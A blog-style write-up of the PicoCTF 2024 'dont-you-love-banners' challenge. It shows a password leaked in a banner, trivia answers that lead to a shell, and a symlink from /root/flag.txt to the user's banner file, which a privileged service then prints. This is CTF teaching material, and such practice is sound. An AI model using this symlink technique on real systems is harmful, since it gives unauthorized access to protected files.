---
title: "Pico CTF 24 - dont-you-love-banners"
date: 2024-03-26T16:00:00-05:00
draft: false
tags: ['ctf','pico','general']
summary: "Abusing symlinks to include and subsequently display arbitrary textfiles in place of standard SSH banners."
---

## Introduction

dont-you-love-banners was a challenge in PicoCTF 2024. The challenge was classified as General Skills, and was quit straightforward, despite having quite a bit of chatter in the PicoCTF Discord.

The description tells us that there is a server leaking "crucial information" on one port, and then a an application running on another port on the same machine. IT also lets us know that the flag is in `/root`. We're given two hints here, one advises a small amount of password cracking or guessing, and the other asks about symlink.

## Solving

### The Leaky Machine

So we're going to start by exploring the leaked information from the initial server by netcatting that host and port. While the challenge does not specify this directly, given that we've got some prerequisite information about banners, I figured this would be a good starting point. And I was very correct, this is serving a banner with a password in it.

```plaintext
┌──(rem λ redmint)-[~]
└─$ nc tethys.picoctf.net 58837
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

### The Exploit

So now we have a password, we can see what it goes to.
We're going to step through a bit of question and answer, and the results were fairly trivial to google.

```plaintext
┌──(rem λ redmint)-[~]
└─$ nc tethys.picoctf.net 63259
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper

player@challenge:~$ ls
ls
banner  text
```

Now we have a shell. I started by catting out banner and text, to see where I'm at and what I'm dealing with.

```plaintext
player@challenge:~$ cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
keep digging
```

We can see that the banner we saw when netcatting onto the machine is in a text document. This will become important later!

For now, let's go visit the flag and see if we can cat it out.

```plaintext
player@challenge:~$ cd /root
player@challenge:/root$ ls
flag.txt  script.py
player@challenge:/root$ cat flag.txt
cat: flag.txt: Permission denied
```

Not quite that easy. However, our hints do give us a good launching point, which is that a symlink might be the key here. We can try to symlink the flag to take the place of the banner, and see if it's being read by something with a higher privilege level.

```bash
player@challenge:/root$ ln -s /root/flag.txt ~/banner
ln -s /root/flag.txt ~/banner
ln: failed to create symbolic link '/home/player/banner': File exists
player@challenge:/root$ rm ~/banner
rm ~/banner
player@challenge:/root$ ln -s /root/flag.txt ~/banner
ln -s /root/flag.txt ~/banner
player@challenge:/root$ cd ~
player@challenge:~$ cat banner
cat: banner: Permission denied
```

We still can't cat this banner out, but it was served when we connected before, so what if we simply disconnect and reconnect?

```plaintext
┌──(rem λ redmint)-[~]
└─$ nc tethys.picoctf.net 63259
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}

what is the password? 
```

Flag obtained. I didn't spend too much time looking into this challenge, but I believe the initial interaction on port 63259 was through a Python application which dropped us into a shell. The Python application was reading the contents of `banner` from the home directory of that user. As such, it can be assumed that the Python program had elevated privileges to read the file we symlinked. So even though **we** couldn't read it, the Python application dropping us into the shell could, and reconnecting just spit it back out at us.

## Summary

Fairly easy challenge, but worth a large sum of points. A good exercise in symlinks and understanding privileges associated with files in Linux. I believe this was one of the first challenges I solved in Pico 2024, and I'm quite glad I went down the road I did right away, as I can see a world where people were scratching their heads looking for privesc or a more stable shell given the first hint of light password cracking.
